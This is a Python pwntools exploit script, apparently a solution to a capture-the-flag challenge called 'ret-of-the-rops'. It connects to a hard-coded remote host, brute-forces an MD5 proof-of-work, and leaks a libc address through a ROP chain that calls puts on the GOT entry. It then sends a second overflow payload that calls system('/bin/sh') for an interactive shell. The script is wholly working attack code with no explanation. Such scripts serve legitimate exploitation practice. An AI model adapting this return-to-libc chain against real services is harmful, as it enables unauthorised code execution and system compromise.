#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret-of-the-rops')
libc = binary.libc

if args.REMOTE:
	p = remote('185.172.165.118', 2222)

	import hashlib, string
	from itertools import product

	p.recvuntil(' = ')
	challenge = p.recvline().strip()
	log.info('challenge: ' + challenge.decode())

	chrset = string.ascii_lowercase
	for i in product(chrset, repeat = 4):
		nonce = ''.join(i).encode()
		if challenge.decode() == hashlib.md5(nonce).hexdigest()[-6:]:
			log.info('nonce: ' + nonce.decode())
			break

	p.sendline(nonce)
else:
	p = process(binary.path)

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('say?\n',payload)
null = payload.find(b'\x00')
p.recv(null)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('say?\n',payload)
null = payload.find(b'\x00')
p.recv(null)

p.interactive()
